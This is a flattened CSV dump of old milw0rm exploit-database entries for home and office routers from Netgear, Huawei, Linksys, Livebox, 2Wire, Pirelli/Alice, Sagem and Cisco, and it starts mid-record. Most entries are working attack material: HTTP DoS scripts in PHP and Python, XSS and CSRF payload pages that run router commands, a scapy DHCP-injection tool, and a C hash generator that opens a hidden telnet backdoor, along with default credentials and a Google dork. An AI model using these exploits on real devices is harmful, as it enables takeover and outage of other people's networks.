<iframe src=""http://192.168.1.1:53/p.html""></iframe>
<bgsound src=""http://192.168.1.1:53""></bgsound>
<bgsound src=""http://192.168.1.1:53/p.wav""></bgsound>
<head><base href=""http://192.168.1.1:53/""></head>
<base href=""http://192.168.1.1:53/"" /></head>
<img src=""p.jpg"" />
<-End->
<html>
<head>
<base href=""https://192.168.2.1:53/"" />
</head>
<body>
<img src=""p.jpg"" />
<img src=""https://192.168.2.1:53/p.jpg"" />
</body>
</html>"
2009-02-25,DoS,Hardware,staticrez,Netgear WGR614v9 Wireless Router,Denial of Service,# milw0rm.com [2009-02-25],"LUNOSEC ADVISORY
Synopsis: Denial of Service condition in Netgear's WGR614v9 Wireless Router
Firmware version tested: v1.2.2_14.0.13NA (LATEST)
Firmware version tested: WNR834Bv2 v2.0.8_2.0.8 # GTADarkDude tested
Proof of Concept:
Appending a question mark to the router's internal IP address after
the forward slash. e.g., http://192.168.1.1/? results in a denial of
service condition where the http server dies and the administrative
interface is no longer available until after a device reboot.
found: fabrizio siciliano (staticrez)"
2009-02-23,Remote,Hardware,Rizki Wicaksono,Optus/Huawei E960 HSDPA Router,Sms Cross-Site Scripting,"http://www.ilmuhacking.com/web-security/xss-attack-using-sms-huawei-e960-hsdpa-router/
# milw0rm.com [2009-02-23]","XSS Attack using SMS to Optus/Huawei E960 HSDPA Router
Synopsis
Huawei E960 HSDPA Router (firmware version 246.11.04.11.110sp04) is
vulnerable to XSS attack using SMS. One of the feature of this router
is the ability to send and receive SMS through its web interface. The
SMS text is presented unescaped/unfiltered on the inbox view, and an
attacker can craft malicious short messages to gain control over
victims router.
Details
The first 32 characters of every incoming SMS is presented in
unescaped form in the inbox view. The 32 characters limit can be
overcome by using several messages, and inserting javascript comment
to merge the current message with the next one.
Example:
First message ends with /* which will comment the all the HTML code up
to the second message
<script>alert('hello '/*
and the second message will start with */ that will close the comment
and continue the script:
*/+'world');</script>
Note that newest message is presented first, so the order of the SMS
sending must be reversed.
Impact
An attacker can
- get victim's PPP password by accessing /js/connection.js
- disconnect victim's internet connection
- send SMS with victim's router
- gain access to victim's WIFI password
Recovery
After an attack is performed, the inbox page can not be used to delete
the received messages (because the delete button is not
available/visible). To remove offending messages from the inbox,
telnet to the router with username 'admin' and password 'admin'.
Huawei E960 uses busybox shell, so standard rm command can be used to
remove the messages (it is located at /tmp/sms/inbox_sms). After
removing the message content, the deleted messages will still be in
the inbox index, but it can now be removed from the inbox page.
Credits
Rizki Wicaksono (http://www.ilmuhacking.com) found this vulnerability.
The Indonesian article at
gives more detail about this vulnerability. This English
translation/summary was done by Yohanes Nugroho."
2009-02-09,Remote,Hardware,ikki,3Com OfficeConnect Wireless Cable/DSL Router,Authentication Bypass,#NAME?,
2009-02-09,DoS,Hardware,Rembrandt,Netgear SSL312 Router,Denial of Service,"https://xxx.xxx.xxx.xxx/cgi-bin/welcome/VPN_only?err=VXNlciBMb2dpbiBGYWlsZWQ=
https://xxx.xxx.xxx.xxx/cgi-bin/welcome/VPN_only?../../../../../
# milw0rm.com [2009-02-09]","_   _ _____ _     ___ _____ _   _
/ / / / ____/ /   /  _/_  __/ / / /
/ /_/ / __/ / /    / /  / / / /_/ /
/ __  / /___/ /____/ /  / / / __  /
/_/ /_/_____/_____/___/ /_/ /_/ /_/
Helith - 0815
Author : Rembrandt
Date : 2008-02-27
Affected Software: propietary CGI
Affected OS : Netgear embedded Linux for the SSL312 router
Propably other devices are affected as well
Type : Denial of Service
OSVDB :
Milw0rm : 8008
CVE :
ISS X-Force: :
BID : 33675
Trying to fix it responsible and get in contact with the vendor:
-- ZDI --
Case Opened  2008-12-28 07:57 GMT-6
Case Closed 2009-01-15 17:01 GMT-6
""After some deliberation we have unfortunately decided that we won't be
accepting bugs affecting NetGear products.""
-- END --
Contacting Netgear and mitre.org: 2009-02-01 12:25 GTM+1
No reaction, release: 2009-02-06 23:59 GTM+1
Netgear VPN router SSL312 is proune to a remote DoS condition which can get
triggered if somebody has access to the webinterface of the VPN router.
The problem is related to a propietary CGI binary and makes is impossible
for users to patch the router. Further in detail analyses will show several
other issues like outdated third party software (e.g. the webserver) and further
problems in the cgi-binary itself which won't get disclosed here.
If you download the source code the affected binary can be found at:
./NG_SSL312-GPL/uClinux/uC-src/real/EasyAccess/EasyAccess/www/cgi-bin/single_cgi
Steps to reproduce:
Visit the Netgear SSL312 VPN router webinterface.
You will see a login field and a password field.
Just enter any random data and proceed.
The URL will include a path like:
If you modify the URL as below and resend your http request the device will
crash and needs a hard reboot.
Example network affected by this: StudiVZ
Simple google dork:
intitle:SSL-VPN intext:password inurl:/cgi-bin/welcome
Workaround:
Preventing others to gain access to the webinterface of the router prevents
the attack.
Kind regards,
Rembrandt"
2008-12-21,DoS,Hardware,r0ut3r,Linksys WAG54G v2 Wireless ADSL Router,HTTPd Denial of Service,# milw0rm.com [2008-12-21],"<?php
* LinkSys Wireless ADSL Router httpd DoS Vulnerability
* Product : Linksys (Division of Cisco Systems)
* Device  : WAG54G V.2
* Firmware: 1.02.20
* Notes   : Other devices and firmware versions are no doubt vulnerable.
* Written by: r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
* Sending a large HTTP GET/POST request (10240) to the router results in DoS
* of the httpd service.
* After discovering this vulnerability I read about similar vulnerabilities
* in different devices. It would seem this device is vulnerable to more
* previously disclosed vulnerabilities also, just this device was not tested.
* It has been suggested that this is a stack overflow vulnerability.
* http://www.securiteam.com/securitynews/5NP0D15GUE.html
* https://www.securityfocus.com/bid/6301/info
* unable to connect to 192.168.1.1:80 (Connection refused)
* r0ut3r@kit:~> nmap 192.168.1.1
* Starting Nmap 4.20 ( http://insecure.org ) at 2008-12-12 12:17 EST
* Interesting ports on 192.168.1.1:
* Not shown: 1695 closed ports
* PORT    STATE SERVICE
* 23/tcp  open  telnet
* 443/tcp open  https
* Nmap finished: 1 IP address (1 host up) scanned in 7.403 seconds
* Looks like HTTP died...
* HTTPS is running however you cannot login. The service is basically useless.
* Telnet is also open for administration (if configured to be).
* Apart from not being able to use the Web Administration Interface the device
* seems to function fine.
set_time_limit(0);
$host = ""192.168.1.1""; //Default IP is 192.168.1.1
if (isset($argv[1]))
$host = $argv[1];
$port = 80;
echo ""Connecting...\n"";
$conn = fsockopen($host, $port, $errno, $errstr);
if ($conn)
$payload = ""GET /"".str_repeat('A', 10240)."" HTTP/1.1"";
if (fwrite($conn, $payload))
echo ""Payload sent!\n"";
fclose($conn);"
2008-12-08,DoS,Windows,0in,Neostrada Livebox Router,Remote Network Down (PoC),"# Neostrada Livebox Router Remote Network Down PoC Exploit
# Author: 0in aka zer0in from Dark-Coders Group!
# Contact: 0in.email(at)gmail.com / 0in(at)dark-coders.pl
# Site: http://dark-coders.pl
# Greetings to: All Dark-Coders Members: die,doctor,m4r1usz,sun8hclf ;*
# Friends: cOndemned,joker,chomzee,TBH
#IRC: #dark-coders & #pvt
# Description:
# When we send a ""specially crafted http packet"" x ~25
#Livebox HTTP service && all network goes down
# Simple PoC source:
#!/usr/bin/python
# milw0rm.com [2008-12-08]","from socket import *
import os
import sys
target = ""192.168.1.1""
def to_vuln(ip):
suck = socket(AF_INET,SOCK_STREAM,0)
try:
conn = suck.connect((ip,80))
except Exception:
check(ip)
return suck
def check(ip):
print ""[+] No HTTP response...""
print ""[+] Server and network should go down!""
print ""[+] Check it with ping...""
os.system(""ping ""+ip)
i=0
print ""[!] Neostrada Livebox Remote Network Down Exploit!!""
print ""[!] [HTTP DoS vuln]  ""
print ""[!] by 0in [0in.email(at)gmail.com]  ""
print ""\n[+] Dosing...""
for i in range(256):
pack3t = ""GET /- HTTP/1.1\r\n\r\n""
POC = to_vuln(target)
POC.send(pack3t)
try:
POC.recv(512)
except Exception:
check(target)"
2008-11-08,DoS,Hardware,hkm,2WIRE DSL Router,'xslt' Denial of Service,"http://gateway.2wire.net/xslt?page=%&
http://gateway.2wire.net/xslt?page=%@
http://gateway.2wire.net/xslt?page=%!
http://gateway.2wire.net/xslt?page=%+
http://gateway.2wire.net/xslt?page=%;
http://gateway.2wire.net/xslt?page=%'
http://gateway.2wire.net/xslt?page=%~
http://gateway.2wire.net/xslt?page=%*
http://gateway.2wire.net/xslt?page=%0
http://gateway.2wire.net/xslt?page=%9
http://gateway.2wire.net/xslt?page=%?
http://home...
# milw0rm.com [2008-11-08]","2WIRE ROUTER DSL DENIAL OF SERVICE
VULNERABLE
Model: 1701HG, 1800HW, 2071HG, 2700HG Gateway
Firmware: v3.17.5, 3.7.1, 4.25.19, 5.29.51
The DSL connection of some 2wire routers is droped when a request to /xslt with the value %X where X is any non alfa numeric character.
PoC: (this can be set in an IMG tag or whatever)
etc...
hkm
hkm {@} hakim.ws
Greets: UNDERGROUND.ORG.MX, daemon, acid_java, beck, dex."
2008-10-14,Remote,Hardware,saxdax & drpepperONE,Telecom Italia Alice Pirelli routers,Backdoor from internal LAN/WAN,"http://www.telecomitalia.com/
http://adsl.alice.it/
http://rapidshare.com/files/153439269/AliceBDhashCreator.zip.html
/* Alice Backdoor Pwd creator by saxdax */
/* this code generates an 8 byte hash to use as the paylod of the ip packet   */
/* the mac must be in an hex file and has to be passed as argument to
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include ""md5.h""
#define GET_UINT32(n,b,i)                       \
#define PUT_UINT32(n,b,i)                       \
#define S(x,n) ((x << n) | ((x & 0xFFFFFFFF) >> (32 - n)))
#define P(a,b,c,d,k,s,t)                                \
#define F(x,y,z) (z ^ (x & (y ^ z)))
#undef F
#define F(x,y,z) (y ^ (z & (x ^ y)))
#undef F
#define F(x,y,z) (x ^ y ^ z)
#undef F
#define F(x,y,z) (y ^ (x | ~z))
#undef F
//for(int i=0;i<8;i++) printf(""length %d\n"",msglen[i]);
//#ifdef TEST
# milw0rm.com [2008-10-14]","saxdax & drpepperONE
Discovered embedded backdoor to activate telnet/ftp/tftp/web extended
admin interface with Admin privileges, from internal network lan on
Alice ADSL CPE
Modem/Router, manufactered by Pirelli based on Broadcom platform.
saxdax & drpepperONE
Router Vendor:          Alice Telecom Italia CPE Modem/Routers manufactered by Pirelli
based on Broadcom platform.
Model Affected:         AGA[Alice Gate2 plus Wi-Fi]/AGB[Alice Gate2plus]AG2P-AG3[Alice Gate W2+]
/AGPV-AGPF[Alice Gate VoIP 2 Plus Wi-Fi]
Firmware Version:     All AGA/AGB/AG2P-AG3/AGPV-AGPF firmware version are affected.
Platforms:                 Customized Linux version 2.6.8.1 on BroadcomBCM96348 chipset.
Vulnerability:             enable telnet/ftp/tftp and web-admin frominternal lan.
Exploitation:              internal network lan, versus Router
Date:                        13 Oct 2008
Authors:                   saxdax & drpepperONE
e-mail:                     saxdax2@gmail.com           drpepppperone@gmail.com
Risk:                       medium>low
1) Introduction
2) Vulnerability
3) The Exploit
4) The Code
5) Fix
1) Introduction
Telecom Italia is the most important Italian ISP offering an ADSL
service named ""Alice"".
Telecom Italia rent out with ""Alice Adsl"" service, different CPE
Modem/Router among which
the affected ones.
The interface to configure these modems are made extremily poor by the
provider to ensure
more control.
There's no way to enable telnet, ftp, tftp or more advanced web pages
from the web interface.
2) Vulnerability
An attacker can activate and get unauthorized access to the routers
administration
interface and telnet/ftp/tftp services from internal network.
Every user in the LAN (or Wireless LAN) can nevertheless have access
to the routers
administration interface and telnet/ftp/tftp!
If an attacker can get access to the administrator interface and
login, he has full control
over the routers configuration.
3) The Exploit
To enable telnet/ftp/tftp and web-admin interface it is necessary send a special
IP packet to router specific ip 192.168.1.1.
This works only from internal LAN where an attacker have and ip like
192.168.1.XX.
The ip packet send to router must have the following feature:
1)IP-protocol-number 255 (there's a RAW SOCKET listening on the router)
2)Payload size 8 byte
3)The payload are the first 8 byte of a salted md5 of the mac address
of device br0
4)br0 in these modems has the same mac of eth0
When the modem receives the packet all services will be enabled.
Example:
>From a GNU/LINUX distrib:
1)Retrieve br0 maccaddress:
arping -I eth0 -c 2 192.168.1.1
ARPING 192.168.1.1 from 192.168.1.2 eth0
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  8.419ms
Unicast reply from 192.168.1.1 [00:01:02:03:04:05]  2.095ms
Sent 2 probes (1 broadcast(s))
Received 2 response(s)
2)Calculate special md5 hash from br0 macaddress: create an hex 6 byte
long file with the mac address.
run the application below and copy the output hash.
3)Send ip packet to router ip 192.168.1.1 with 8 byte paylod file
(with the tool you like)
i.e.: nemesis ip -D 192.168.1.1 -p 255 -P hash.hex
4)Telnet to router :
telnet 192.168.1.1
BCM96348 ADSL Router
Login: admin
Password:
4) The Code
the program */
*  RFC 1321 compliant MD5 implementation
*  Copyright (C) 2001-2003  Christophe Devine
*  This program is free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 2 of the License, or
*  (at your option) any later version.
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software
*  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
{                                               \
(n) = ( (uint32) (b)[(i)    ]       )       \
| ( (uint32) (b)[(i) + 1] <<  8 )       \
| ( (uint32) (b)[(i) + 2] << 16 )       \
| ( (uint32) (b)[(i) + 3] << 24 );      \
{                                               \
(b)[(i)    ] = (uint8) ( (n)       );       \
(b)[(i) + 1] = (uint8) ( (n) >>  8 );       \
(b)[(i) + 2] = (uint8) ( (n) >> 16 );       \
(b)[(i) + 3] = (uint8) ( (n) >> 24 );       \
void md5_starts( md5_context *ctx )
ctx->total[0] = 0;
ctx->total[1] = 0;
ctx->state[0] = 0x67452301;
ctx->state[1] = 0xEFCDAB89;
ctx->state[2] = 0x98BADCFE;
ctx->state[3] = 0x10325476;
void md5_process( md5_context *ctx, uint8 data[64] )
uint32 X[16], A, B, C, D;
GET_UINT32( X[0],  data,  0 );
GET_UINT32( X[1],  data,  4 );
GET_UINT32( X[2],  data,  8 );
GET_UINT32( X[3],  data, 12 );
GET_UINT32( X[4],  data, 16 );
GET_UINT32( X[5],  data, 20 );
GET_UINT32( X[6],  data, 24 );
GET_UINT32( X[7],  data, 28 );
GET_UINT32( X[8],  data, 32 );
GET_UINT32( X[9],  data, 36 );
GET_UINT32( X[10], data, 40 );
GET_UINT32( X[11], data, 44 );
GET_UINT32( X[12], data, 48 );
GET_UINT32( X[13], data, 52 );
GET_UINT32( X[14], data, 56 );
GET_UINT32( X[15], data, 60 );
{                                                       \
a += F(b,c,d) + X[k] + t; a = S(a,s) + b;           \
A = ctx->state[0];
B = ctx->state[1];
C = ctx->state[2];
D = ctx->state[3];
P( A, B, C, D,  0,  7, 0xD76AA478 );
P( D, A, B, C,  1, 12, 0xE8C7B756 );
P( C, D, A, B,  2, 17, 0x242070DB );
P( B, C, D, A,  3, 22, 0xC1BDCEEE );
P( A, B, C, D,  4,  7, 0xF57C0FAF );
P( D, A, B, C,  5, 12, 0x4787C62A );
P( C, D, A, B,  6, 17, 0xA8304613 );
P( B, C, D, A,  7, 22, 0xFD469501 );
P( A, B, C, D,  8,  7, 0x698098D8 );
P( D, A, B, C,  9, 12, 0x8B44F7AF );
P( C, D, A, B, 10, 17, 0xFFFF5BB1 );
P( B, C, D, A, 11, 22, 0x895CD7BE );
P( A, B, C, D, 12,  7, 0x6B901122 );
P( D, A, B, C, 13, 12, 0xFD987193 );
P( C, D, A, B, 14, 17, 0xA679438E );
P( B, C, D, A, 15, 22, 0x49B40821 );
P( A, B, C, D,  1,  5, 0xF61E2562 );
P( D, A, B, C,  6,  9, 0xC040B340 );
P( C, D, A, B, 11, 14, 0x265E5A51 );
P( B, C, D, A,  0, 20, 0xE9B6C7AA );
P( A, B, C, D,  5,  5, 0xD62F105D );
P( D, A, B, C, 10,  9, 0x02441453 );
P( C, D, A, B, 15, 14, 0xD8A1E681 );
P( B, C, D, A,  4, 20, 0xE7D3FBC8 );
P( A, B, C, D,  9,  5, 0x21E1CDE6 );
P( D, A, B, C, 14,  9, 0xC33707D6 );
P( C, D, A, B,  3, 14, 0xF4D50D87 );
P( B, C, D, A,  8, 20, 0x455A14ED );
P( A, B, C, D, 13,  5, 0xA9E3E905 );
P( D, A, B, C,  2,  9, 0xFCEFA3F8 );
P( C, D, A, B,  7, 14, 0x676F02D9 );
P( B, C, D, A, 12, 20, 0x8D2A4C8A );
P( A, B, C, D,  5,  4, 0xFFFA3942 );
P( D, A, B, C,  8, 11, 0x8771F681 );
P( C, D, A, B, 11, 16, 0x6D9D6122 );
P( B, C, D, A, 14, 23, 0xFDE5380C );
P( A, B, C, D,  1,  4, 0xA4BEEA44 );
P( D, A, B, C,  4, 11, 0x4BDECFA9 );
P( C, D, A, B,  7, 16, 0xF6BB4B60 );
P( B, C, D, A, 10, 23, 0xBEBFBC70 );
P( A, B, C, D, 13,  4, 0x289B7EC6 );
P( D, A, B, C,  0, 11, 0xEAA127FA );
P( C, D, A, B,  3, 16, 0xD4EF3085 );
P( B, C, D, A,  6, 23, 0x04881D05 );
P( A, B, C, D,  9,  4, 0xD9D4D039 );
P( D, A, B, C, 12, 11, 0xE6DB99E5 );
P( C, D, A, B, 15, 16, 0x1FA27CF8 );
P( B, C, D, A,  2, 23, 0xC4AC5665 );
P( A, B, C, D,  0,  6, 0xF4292244 );
P( D, A, B, C,  7, 10, 0x432AFF97 );
P( C, D, A, B, 14, 15, 0xAB9423A7 );
P( B, C, D, A,  5, 21, 0xFC93A039 );
P( A, B, C, D, 12,  6, 0x655B59C3 );
P( D, A, B, C,  3, 10, 0x8F0CCC92 );
P( C, D, A, B, 10, 15, 0xFFEFF47D );
P( B, C, D, A,  1, 21, 0x85845DD1 );
P( A, B, C, D,  8,  6, 0x6FA87E4F );
P( D, A, B, C, 15, 10, 0xFE2CE6E0 );
P( C, D, A, B,  6, 15, 0xA3014314 );
P( B, C, D, A, 13, 21, 0x4E0811A1 );
P( A, B, C, D,  4,  6, 0xF7537E82 );
P( D, A, B, C, 11, 10, 0xBD3AF235 );
P( C, D, A, B,  2, 15, 0x2AD7D2BB );
P( B, C, D, A,  9, 21, 0xEB86D391 );
ctx->state[0] += A;
ctx->state[1] += B;
ctx->state[2] += C;
ctx->state[3] += D;
void md5_update( md5_context *ctx, uint8 *input, uint32 length )
uint32 left, fill;
if( ! length ) return;
left = ctx->total[0] & 0x3F;
fill = 64 - left;
ctx->total[0] += length;
ctx->total[0] &= 0xFFFFFFFF;
if( ctx->total[0] < length )
ctx->total[1]++;
if( left && length >= fill )
memcpy( (void *) (ctx->buffer + left),
(void *) input, fill );
md5_process( ctx, ctx->buffer );
length -= fill;
input  += fill;
left = 0;
while( length >= 64 )
md5_process( ctx, input );
length -= 64;
input  += 64;
if( length )
memcpy( (void *) (ctx->buffer + left),
(void *) input, length );
static uint8 md5_padding[64] =
0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
void md5_finish( md5_context *ctx, uint8 digest[16] )
uint32 last, padn;
uint32 high, low;
uint8 msglen[8];
high = ( ctx->total[0] >> 29 )
| ( ctx->total[1] <<  3 );
low  = ( ctx->total[0] <<  3 );
PUT_UINT32( low,  msglen, 0 );
PUT_UINT32( high, msglen, 4 );
last = ctx->total[0] & 0x3F;
padn = ( last < 56 ) ? ( 56 - last ) : ( 120 - last );
md5_update( ctx, md5_padding, padn );
md5_update( ctx, msglen, 8 );
PUT_UINT32( ctx->state[0], digest,  0 );
PUT_UINT32( ctx->state[1], digest,  4 );
PUT_UINT32( ctx->state[2], digest,  8 );
PUT_UINT32( ctx->state[3], digest, 12 );
* those are the standard RFC 1321 test vectors
static char *msg[] =
""a"",
""abc"",
""message digest"",
""abcdefghijklmnopqrstuvwxyz"",
""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"",
""12345678901234567890123456789012345678901234567890123456789012"" \
""345678901234567890""
static char *val[] =
""d41d8cd98f00b204e9800998ecf8427e"",
""0cc175b9c0f1b6a831c399e269772661"",
""900150983cd24fb0d6963f7d28e17f72"",
""f96b697d7cb7938d525a2f31aaf161d0"",
""c3fcd3d76192e4007dfb496cca67e13b"",
""d174ab98d277d9f5a5611c2c9f419d9f"",
""57edf4a22be3c955ac49da2e2107b67a""
static char saltOrig[] =
{0x04, 0x07, 0x67, 0x10, 0x02, 0x81, 0xFA, 0x66, 0x11, 0x41, 0x68,
0x11, 0x17, 0x01, 0x05, 0x22, 0x71, 0x04, 0x10, 0x33};
int main( int argc, char *argv[] )
FILE *f;
int i, j;
char output[33];
md5_context ctx;
unsigned char buf[1000];
unsigned char md5sum[16];
unsigned char salt[20];
printf( ""****************************\n"");
printf( ""Alice BackDoor hash creator \n"");
printf( ""by saxdax and drPepperOne   \n"");
printf( ""****************************\n\n"");
if( argc < 2 )
printf( ""\n Usage: %s pathfileMAC\n\n"", argv[0] );
return 0;
if( ! ( f = fopen( argv[1], ""rb"" ) ) )
perror( ""fopen"" );
return( 1 );
md5_starts( &ctx );
while( ( i = fread( buf, 1, sizeof( buf ), f ) ) > 0 )
md5_update( &ctx, buf, i );
memcpy(salt, saltOrig, 20);
md5_update( &ctx, salt, 20 );
md5_finish( &ctx, md5sum );
printf(""Payload is: "");
for( j = 0; j < 8; j++ )
printf( ""%02x"", md5sum[j] );
return( 0 );
5) Fix
Atcualy at 13 Oct 2008 NO FIX available."
2008-09-22,Remote,Hardware,Zigma,Sagem F@ST Routers,DHCP Hostname Cross-Site Request Forgery,"#!/usr/bin/env python
# OOO OOO             OO                            OOO
#  O   O               O                           O   O
#  O   O               O                           O   O
#  O   O  OO OO    OOOOO   OOOOO  OOO OO  OOOOOO   O   O  OO OO    OOOOO
#  O   O   OO  O  O    O  O     O   OO  O O   O    O   O   OO  O  O     O
#  O   O   O   O  O    O  OOOOOOO   O        O     O   O   O   O  OOOOOOO
#  O   O   O   O  O    O  O         O       O      O   O   O   O  O
#  O   O   O   O  O    O  O     O   O      O   O   O   O   O   O  O     O
#   OOO   OOO OOO  OOOOOO  OOOOO  OOOOO   OOOOOO    OOO   OOO OOO  OOOOO
# Sagem Routers F@ST (1200/1240/1400/1400W/1500/1500-WG/2404) Remote CSRF Exploit (dhcp hostname attack)
# Discovery Date     : 13/09/2009
# Author             : Underz0ne Crew
#                      Zigma
# Author Of The Tool : Rafael Dominguez Vega
# First Of all Read this paper : http://www.mwrinfosecurity.com/publications/mwri_behind-enemy-lines_2008-07-25.pdf
# Description : Using DHCP as a method of attack, arbitrary and malicious scripting can be injected into the DHCP administrative and logs pages (if enabled). When the web administration toold is accessed, the code injection will execute with administrative privileges, which could lead to a complete compromise of the system.
#  How To Exploit :
# Zigma@Underz0ne # python dhcpattack.py -i eth0 -t 192.168.1.1 -p ""<IFRAME height=0 width=0 src='http://192.168.1.1/restoreinfo.cgi'></IFRAME>""
# 0y]Z
# Starting....
# .
# Sent 1 packets.
# Now When the Admin Enters to ""Advanced Status"" ""DHCP"" the CSRF Get's executed and the account get reseted , now u can simply access the web-based Administration Panel with : admin:admin
# So Many Routers Suffers from dhcp hostname attack...
#                         --/*/-----------------------------------------/*--
# This tool is distributed under a BSD licence. A copy of this
# should have been included with this file.
#Copyright (c) 2008, Rafael Dominguez Vega
# All rights reserved.
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#    * Neither the name of MWR InfoSecurity nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
#CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
#EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
#PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
#PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
#LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
#NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
#SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#Copyright (c) 2008, Rafael Dominguez Vega.
# This tool is designed for the purpose of performing security
# testing only and is not intended to be used for unlawful
# activities.
# This tool can be used to check for DHCP script injection vulnerabilities
# in different sofware products.
# Required Libraries:
#scapy.py - ""Packet generator/sniffer and network scanner/discovery""
#http://www.secdev.org/projects/scapy/
# Help can be viewed by running this file with --help.
# Author: Rafael Dominguez Vega
# Version: 0.0.2
# Further information: rafael ({dot}) dominguez-vega <(at)> mwrinfosecurity {(dot)} com
#Acknowledgement to Paul Cannon & Frank Millman for the following code chunk
# end of code chunk
# milw0rm.com [2008-09-22]","import optparse
from scapy import *
import socket
import fcntl
import struct
import os
import sys
import string
from optparse import OptionParser
class OptionParser (optparse.OptionParser):
def check_required (self, opt):
option = self.get_option(opt)
if getattr(self.values, option.dest) is None:
self.error(""%s option not supplied"" % option)
parser = OptionParser()
parser.add_option(""-i"", ""--interface"", action=""store"", dest=""hwr"",help=""Network Interface (required)"")
parser.add_option(""-t"", ""--target"", action=""store"", dest=""server"", help=""DHCP Server IP address (required)"")
parser.add_option(""-p"", ""--hostname"", action=""store"", dest=""payload"",  help=""DHCP Hostname. Between double quotes (\""\"") if special characters are used (required)"")
(options, args) = parser.parse_args()
parser.check_required(""-i"")
if options.hwr:
hwr = options.hwr
else:
sys.exit(0)
parser.check_required(""-t"")
if options.server:
server = options.server
else:
sys.exit(0)
parser.check_required(""-p"")
if options.payload:
payload = options.payload
else:
sys.exit(0)
def get_ip_address(ifname):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
return socket.inet_ntoa(fcntl.ioctl(
s.fileno(),
0x8915,
struct.pack('256s', ifname[:15])
)[20:24])
def getMacAddress():
if sys.platform == 'win32':
for line in os.popen(""ipconfig /all""):
if line.lstrip().startswith('Physical Address'):
mac = line.split(':')[1].strip().replace('-',':')
break
else:
for line in os.popen(""/sbin/ifconfig""):
if line.find('Ether') > -1:
mac = line.split()[4]
break
return mac
srcmac = getMacAddress()
ip = get_ip_address(hwr)
macad = srcmac.split("":"")
n0 = int(macad[0], 16)
n1 = int(macad[1], 16)
n2 = int(macad[2], 16)
n3 = int(macad[3], 16)
n4 = int(macad[4], 16)
n5 = int(macad[5], 16)
m0 = chr(n0)
m1 = chr(n1)
m2 = chr(n2)
m3 = chr(n3)
m4 = chr(n4)
m5 = chr(n5)
print(m0)
chmac = (m0+m1+m2+m3+m4+m5)
q = ip.split(""."")
t0 = int(q[0])
t1 = int(q[1])
t2 = int(q[2])
t3 = int(q[3])
r0 = chr(t0)
r1 = chr(t1)
r2 = chr(t2)
r3 = chr(t3)
hexip = (r0+r1+r2+r3)
print chmac
print hexip
print(""Starting...."")
ether = Ether(src= srcmac,dst=""ff:ff:ff:ff:ff:ff"")
ip = IP(src=""0.0.0.0"",dst=""255.255.255.255"")
udp = UDP(sport=68,dport=67)
bootp = BOOTP(op=""BOOTREQUEST"", chaddr= chmac)
dhcp = DHCP(options=[('message-type',3),('hostname', payload),(50, hexip),(""server_id"", server),('param_req_list','pad'),('end'),('pad')])
discover_packet = ether/ip/udp/bootp/dhcp
sendp(discover_packet)"
2008-09-17,Remote,Hardware,Jeremy Brown,Cisco Router,HTTP Administration Cross-Site Request Forgery / Command Execution (2),# milw0rm.com [2008-09-17],"<!-- Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]
Cisco Router HTTP Administration CSRF Remote Command Execution Universal Exploit #2
Replace ""10.10.10.1"" with the IP address of the target router, embed this in a web
page and hope for the best. Cisco Admin's + Safari are the best targets ;) -->
<html>
<body>
<body onload=""fdsa.submit();"">
<form name=fdsa method=""post"" action=""http://10.10.10.1/level/15/exec/-/configure/http"">
<input type=hidden name=command value=""alias exec xx xx"">
<input type=hidden name=command_url     value=""/level/15/exec/-"">
<input type=hidden name=new_command_url value=""/level/15/configure/-"">
</body>
</html>"
2008-09-17,Remote,Hardware,Jeremy Brown,Cisco Router,HTTP Administration Cross-Site Request Forgery / Command Execution (1),# milw0rm.com [2008-09-17],"<!-- Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]
Cisco Router HTTP Administration CSRF Remote Command Execution Universal Exploit #1
Replace ""10.10.10.1"" with the IP address of the target router, embed this in a web
page and hope for the best. Cisco Admin's + Safari are the best targets ;) -->
<html>
<body>
<body onload=""asdf.submit();"">
<form name=asdf method=""post"" action=""http://10.10.10.1/level/15/exec/-"">
<input type=hidden name=command value=""show privilege"">
<input type=hidden name=command_url value=""/level/15/exec/-"">
</body>
</html>"
